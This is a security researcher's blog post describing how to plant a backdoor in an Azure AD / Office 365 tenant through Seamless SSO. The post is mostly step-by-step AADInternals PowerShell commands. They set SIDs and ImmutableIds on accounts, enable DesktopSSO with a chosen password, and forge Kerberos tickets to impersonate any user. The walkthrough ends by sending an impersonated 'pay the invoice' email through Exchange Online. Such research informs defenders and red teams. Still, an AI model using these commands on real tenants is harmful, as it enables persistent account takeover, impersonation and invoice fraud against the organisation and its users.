+++
title = "How to create a backdoor to Azure AD - part 2: Seamless SSO and Kerberos"
date = "2019-10-30"
lastmod = "2020-08-05"
categories =["blog"]
tags = ["Azure Active Directory","PowerShell","AADInternals","Security"]
thumbnail = "/images/posts/backdoor_i.png"
+++

In my earlier <a href="/post/aadbackdoor/" target="_blank">blog post</a> I explained how to create a backdoor to Azure AD using an identity federation <a href="/post/federation-vulnerability/" target="_blank">~~vulnerability~~ feature</a> I discovered in 2017. 
In this blog post, I'll explain how to create a backdoor using Seamless SSO and how to exploit it using forged Kerberos tickets.

<!--more-->
Microsoft introduced a <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso" target="_blank">Seamless Single-Sign-On</a> (aka. DesktopSSO) in 2015. It is using Kerberos tickets to allow users to log in automatically to Office 365 from their domain-joined computers.
Even though the feature makes using Office 365 much easier for end-users, it can be also used as a backdoor to impersonate users. 
When compared to the backdoor created using <a href="/post/aadbackdoor/" target="_blank">identity federation</a>, this is less insecure as it can't be used to bypass MFA.

**Note!** In this blog, I'm using the **<a href="/aadinternals" target="_new">AADInternals</a>** PowerShell module. 

# Prerequisities
The backdoor utilises a Seamless SSO and forged Kerberos tickets. The feature is based on my research during the summer and early fall 2019.  
To create a backdoor, all you need is a user with Global Admin access to Azure AD / Office 365 tenant and <a href="/aadinternals" target="_blank">AADInternals</a> PowerShell module version 0.2.6. or later.

## Preparing the users
The backdoor requires that the account to be impersonated has an **OnPremisesSecurityIdentifier** attribute set. 
If the account is synced from on-premises, the attribute contains a SID of user's on-prem AD object. 
If the account is not synced, you need to set it manually. The value can be basically any correctly formatted SID, as long as it is unique within the tenant. 

Setting the SID requires that the user has also **ImmutableId** set. If that is not set, it also has to be set manually. The value can be basically any string, as long as it is unique within the tenant.

To set the ImmutableId, use the following commands
{{< highlight powershell >}}
# Get AccessToken
$at=Get-AADIntAccessTokenForAADGraph

# Set the ImmutableId
Set-AADIntUser -UserPrincipalName "admin@company.onmicrosoft.com" -ImmutableId "AADBackdoor" -AccessToken $at
{{< /highlight>}}

> **Edit Jul 14th 2020:**
> Microsoft have blocked the possibility to update SID of cloud-only Admin users!

To set the SID, use the following commands
{{< highlight powershell >}}
# Create a SID object. MUST be unique within the tenant. Increase the last number by one for each new user.
$objSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-0-0-0-0-1")

# Create a byte array for the binary form of the SID
$b64SID = [System.Byte[]]::CreateInstance([System.Byte],28)

# Export binary SID to the variable
$objSID.GetBinaryForm($b64SID,0)

# Convert the binary SID to Base 64 string
$strB64SID=[convert]::ToBase64String($b64SID)

# Set the SID for the user. Use ImmutableId for the sourceAnchor.
Set-AADIntAzureADObject -AccessToken $at -sourceAnchor "AADBackDoor" -onPremiseSecurityIdentifier $strB64SID
{{< /highlight>}}

## Creating a backdoor
Next, you create a backdoor with following PowerShell commands. 

{{< highlight powershell >}}
# Create an access token for PTA
$pt=Get-AADIntAccessTokenForPTA

# Enable the DesktopSSO
Set-AADIntDesktopSSOEnabled -AccessToken $pt -Enable $true

# Enable the DesktopSSO for the given domain
Set-AADIntDesktopSSO -AccessToken $pt -DomainName company.com -Password "mypassword" -Enable $true
{{< /highlight>}}

# Use the backdoor

Now the backdoor is ready to be used! Use the following commands to create a Kerberos ticket, use it to get an access token for Exchange Online, and finally send an email using Outlook.

{{< highlight powershell >}}
# Create a Kerberos ticket
$kt=New-AADIntKerberosTicket -SidString "S-1-5-0-0-0-0-1" -Password "mypassword"

# Get an access token for Exchange Online
$et=Get-AADIntAccessTokenForEXO -KerberosTicket $kt -Domain company.com

# Send an email using Outlook API
Send-AADIntOutlookMessage -AccessToken $et -Recipient "accounting@company.com" -Subject "Invoice" -Message "Pay the attached invoice <b>ASAP!</b>"

{{< /highlight>}}


# Afterword
 
Now you have a backdoor which you can use to access Office 365. Conditional access can, however, block the access or force the MFA. 

**Note!** The backdoor allows you to log in as ANY USER of the tenant, as long as the user's **SID** is known.
